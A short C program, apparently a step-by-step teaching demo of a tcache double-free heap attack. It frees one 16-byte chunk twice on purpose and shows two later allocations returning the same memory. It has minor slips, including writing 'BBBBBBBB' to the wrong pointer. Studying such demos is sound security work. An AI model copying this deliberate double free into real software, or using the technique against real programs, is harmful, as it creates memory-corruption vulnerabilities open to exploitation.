#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
  printf("------------------------------------\n");
  printf("-     T-Cache Fastbin Attack       -\n");
  printf("------------------------------------\n");
  getchar();

  fprintf(stderr, "Allocating 16 bytes on the heap.\n");
  char *a = malloc(16);
  strcpy(a, "AAAAAAAA");
  fprintf(stderr, "malloc(16): %p\n", a);
  getchar();

  fprintf(stderr, "Freeing once...\n");
  free(a);
  fprintf(stderr, "T-Cache Free List: [ %p <-- 0x0 ].\n", a);
  getchar();

  fprintf(stderr, "Freeing twice...\n");
  free(a);
  fprintf(stderr, "T-Cache Free List: [ %p <-- %p ].\n", a, a);
  getchar();

  fprintf(stderr, "Allocating a fresh 16 bytes on the heap.\n");
  a = malloc(16);
  strcpy(a, "AAAAAAAA");
  fprintf(stderr, "malloc(16): %p\n", a);
  fprintf(stderr, "T-Cache Free List: [ %p <-- 0x0 ].\n", a);
  getchar();

  fprintf(stderr, "Allocating another 16 bytes on the heap.\n");
  char *b = malloc(16);
  strcpy(a, "BBBBBBBB");
  fprintf(stderr, "malloc(16): %p\n", a);

  fprintf(
      stderr,
      "Both are pointers to the same chunk!\n chunk_a = %p\n chunk b = %p\n", a,
      b);
  getchar();

  b = malloc(16);
  getchar();

  return 0;
}
